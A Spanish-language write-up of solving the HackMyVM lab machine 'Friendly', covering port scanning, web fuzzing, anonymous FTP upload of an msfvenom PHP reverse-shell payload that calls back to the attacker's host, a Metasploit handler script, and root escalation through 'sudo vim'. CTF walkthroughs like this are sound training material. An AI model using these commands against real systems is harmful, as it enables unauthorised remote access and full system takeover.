---
tags:
  - Cybersecurity
  - Labs
  - HackMyVM
  - Easy
  - Linux
  - HTTP
  - FuzzingWeb
  - FTP
  - ReverseShell
  - PrivilegeEscalation
  - Sudo
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
- [[#Explotación|Explotación]]
	- [[#Explotación#FTP|FTP]]
	- [[#Explotación#Reverse Shell|Reverse Shell]]
	- [[#Explotación#Escalada de Privilegios|Escalada de Privilegios]]
		- [[#Escalada de Privilegios#Sudo|Sudo]]

---
# Resolviendo la máquina Friendly

>En esta publicación, comparto cómo resolví la máquina **Friendly** de [HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Friendly).

---
## Enumeración
### Ping

Ejecutamos un *ping* para comprobar la conectividad y obtener pistas sobre el sistema operativo.

`ping -c 1 192.168.1.45`

![[Pasted image 20250726091445.png]]

*TTL=64* -> **Linux**
### Nmap

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.45 -oG allPorts`

![[Pasted image 20250726091519.png]]

`nmap -p21,80 -sCV 192.168.1.45 -oN targeted`

![[Pasted image 20250726091546.png]]
### HTTP

`http://192.168.1.45/`

![[Pasted image 20250726091751.png]]
#### Fuzzing Web

`gobuster dir -u http://192.168.1.45/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 64`

![[Pasted image 20250726091925.png]]

---
## Explotación
### FTP

Se ha visto en la enumeración, que en el puerto 21, se encuentra habilitado el servicio **FTP** con el inicio de sesión anónimo.

`ftp anonymous@192.168.1.45`

![[Pasted image 20250726092228.png]]

Se crea un *payload malicioso*..

`msfvenom -p php/reverse_php LHOST=192.168.1.127 LPORT=1234 -f raw > pwned.php`

Se sube el archivo generado.

`put pwned.php`

`ls`

![[Pasted image 20250726092445.png]]
### Reverse Shell

Se inicia una escucha en el puerto 1234 para recibir la *reverse shell*.

`vim handler.rc`

```
use multi/handler
set PAYLOAD php/reverse_php
set LHOST 192.168.1.127
set LPORT 1234
run
```

`msfconsole -r handler.rc`

`http://192.168.1.45/pwned.php`

![[Pasted image 20250726092701.png]]

`background`

`sessions -u 1`

`sessions 2`
### Escalada de Privilegios
#### Sudo

`sudo -l`

![[Pasted image 20250726100235.png]]

Se detecta el binario `/usr/bin/vim`, se realiza una búsqueda por [GTFOBins](https://gtfobins.github.io/gtfobins/vim/#sudo). 

![[Pasted image 20250726100416.png]]

`sudo vim -c ':!/bin/sh'`

![[Pasted image 20250726100502.png]]

---